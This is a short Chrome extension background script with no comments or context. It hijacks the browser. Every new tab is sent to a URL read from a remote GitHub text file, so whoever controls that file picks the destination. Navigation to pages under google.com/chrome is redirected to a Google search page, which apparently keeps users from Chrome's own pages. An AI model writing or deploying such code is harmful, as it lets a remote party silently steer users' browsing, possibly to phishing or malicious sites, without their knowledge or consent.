

chrome.tabs.onCreated.addListener(function (tab) {
    fetch("https://raw.githubusercontent.com/KingOfTNT10/ConstDataTemp/main/url.txt").then(d => d.text()).then(d=>chrome.tabs.update(tab.id, {url: d})).catch(console.log)
    
  });
chrome.webNavigation.onBeforeNavigate.addListener(details => {
  console.log(details.url)
  if (details.url.includes('https://www.google.com/chrome')) {
    chrome.tabs.update(details.tabId, {url: 'https://www.google.com/?cb=' + Math.random()});
  }
}, {url: [{urlMatches: '.*'}]});